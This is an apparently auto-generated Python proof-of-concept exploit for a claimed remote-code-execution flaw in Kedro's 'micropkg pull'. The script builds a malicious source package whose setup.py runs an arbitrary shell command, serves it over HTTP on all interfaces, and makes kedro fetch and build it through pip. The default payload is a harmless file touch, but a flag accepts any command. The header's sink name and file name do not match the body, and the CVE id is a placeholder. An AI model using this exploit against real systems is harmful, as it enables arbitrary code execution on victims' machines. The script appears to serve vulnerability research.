#!/usr/bin/env python3
# PoC for kedro (/home/xcy/.local/lib/python3.14/site-packages/kedro)
# Path: rce-002
# Sink: _describe_git
# Auto-generated — run with: python3 rce_cli_pyproject__describe_git.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept Exploit for Kedro micropkg pull RCE (CVE-XXXX-XXXX)

Vulnerability: Remote Code Execution via malicious pip package download
Vector: The `kedro micropkg pull` command accepts a user-controlled `package_path`
        parameter that is passed directly to `pip download`. By providing a URL
        to a malicious Python package (sdist) that contains a setup.py with
        arbitrary code, an attacker can achieve RCE when pip builds the package.

Impact: Arbitrary code execution in the context of the Kedro user.
"""

import sys
import os
import tempfile
import shutil
import subprocess
import tarfile
import io
import textwrap
import argparse

# Configuration - change these as needed
HOST = "0.0.0.0"  # Listen on all interfaces
PORT = 9999       # Port for the malicious package server
PAYLOAD = "touch /tmp/poc_success.txt"  # Benign payload for PoC

def create_malicious_package(output_dir, payload):
    """
    Create a malicious Python source distribution that executes the payload
    during pip's build process.
    """
    pkg_name = "malicious-pkg"
    pkg_dir = os.path.join(output_dir, pkg_name)
    os.makedirs(pkg_dir, exist_ok=True)
    
    # Create setup.py with malicious code
    setup_py = textwrap.dedent(f"""
    import os
    import sys
    from setuptools import setup
    
    # Execute payload during build
    os.system("{payload}")
    
    setup(
        name="{pkg_name}",
        version="0.0.1",
        packages=[],
    )
    """)
    
    with open(os.path.join(pkg_dir, "setup.py"), "w") as f:
        f.write(setup_py)
    
    # Create minimal setup.cfg
    with open(os.path.join(pkg_dir, "setup.cfg"), "w") as f:
        f.write("[metadata]\nname = {}\nversion = 0.0.1\n".format(pkg_name))
    
    # Create PKG-INFO
    os.makedirs(os.path.join(pkg_dir, f"{pkg_name}.egg-info"), exist_ok=True)
    with open(os.path.join(pkg_dir, f"{pkg_name}.egg-info", "PKG-INFO"), "w") as f:
        f.write("Metadata-Version: 2.1\nName: {}\nVersion: 0.0.1\n".format(pkg_name))
    
    # Create sdist tar.gz
    sdist_path = os.path.join(output_dir, f"{pkg_name}-0.0.1.tar.gz")
    with tarfile.open(sdist_path, "w:gz") as tar:
        tar.add(pkg_dir, arcname=f"{pkg_name}-0.0.1")
    
    return sdist_path

def start_malicious_server(package_path, host, port):
    """
    Start a simple HTTP server to serve the malicious package.
    This simulates an attacker-controlled PyPI mirror or direct URL.
    """
    import http.server
    import socketserver
    
    os.chdir(os.path.dirname(package_path))
    
    class Handler(http.server.SimpleHTTPRequestHandler):
        def do_GET(self):
            # Serve the malicious package
            self.send_response(200)
            self.send_header("Content-type", "application/gzip")
            self.end_headers()
            with open(package_path, "rb") as f:
                self.wfile.write(f.read())
    
    print(f"[*] Starting malicious package server on {host}:{port}")
    print(f"[*] Serving package: {os.path.basename(package_path)}")
    
    with socketserver.TCPServer((host, port), Handler) as httpd:
        print(f"[*] Server started. Press Ctrl+C to stop.")
        httpd.serve_forever()

def exploit(target_url=None):
    """
    Main exploit function.
    If target_url is provided, it will attempt to trigger the vulnerability
    by running kedro micropkg pull with the malicious URL.
    Otherwise, it sets up the malicious server.
    """
    print("[*] Kedro micropkg pull RCE PoC")
    print("[*] ============================")
    
    # Create temporary directory for malicious package
    temp_dir = tempfile.mkdtemp()
    
    try:
        # Create malicious package
        print(f"[*] Creating malicious package with payload: {PAYLOAD}")
        sdist_path = create_malicious_package(temp_dir, PAYLOAD)
        print(f"[*] Malicious package created at: {sdist_path}")
        
        if target_url:
            # Attempt to trigger the vulnerability
            print(f"[*] Attempting to trigger RCE via: {target_url}")
            
            # The package_path flows to pip download which will fetch and build
            # the malicious package, executing our payload
            cmd = [
                sys.executable, "-m", "kedro", "micropkg", "pull",
                "--package-path", target_url
            ]
            
            print(f"[*] Running command: {' '.join(cmd)}")
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            if result.returncode == 0:
                print("[+] Command executed successfully!")
            else:
                print(f"[-] Command failed with return code: {result.returncode}")
                print(f"[-] stderr: {result.stderr}")
            
            # Check if payload was executed
            if os.path.exists("/tmp/poc_success.txt"):
                print("[+] SUCCESS: Payload executed! File /tmp/poc_success.txt created.")
            else:
                print("[-] Payload may not have executed. Check /tmp/poc_success.txt")
        else:
            # Start server mode
            print("[*] Starting in server mode. Use the URL below as package_path:")
            print(f"[*] http://{HOST}:{PORT}/{os.path.basename(sdist_path)}")
            start_malicious_server(sdist_path, HOST, PORT)
            
    except KeyboardInterrupt:
        print("\n[*] Interrupted by user")
    except Exception as e:
        print(f"[-] Error: {e}")
    finally:
        # Cleanup
        shutil.rmtree(temp_dir, ignore_errors=True)
        if os.path.exists("/tmp/poc_success.txt"):
            os.remove("/tmp/poc_success.txt")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Kedro micropkg pull RCE PoC")
    parser.add_argument("--target", help="Target URL of malicious package to exploit")
    parser.add_argument("--host", default=HOST, help="Host to bind server to")
    parser.add_argument("--port", type=int, default=PORT, help="Port to bind server to")
    parser.add_argument("--payload", default=PAYLOAD, help="Payload command to execute")
    
    args = parser.parse_args()
    
    HOST = args.host
    PORT = args.port
    PAYLOAD = args.payload
    
    exploit(args.target)
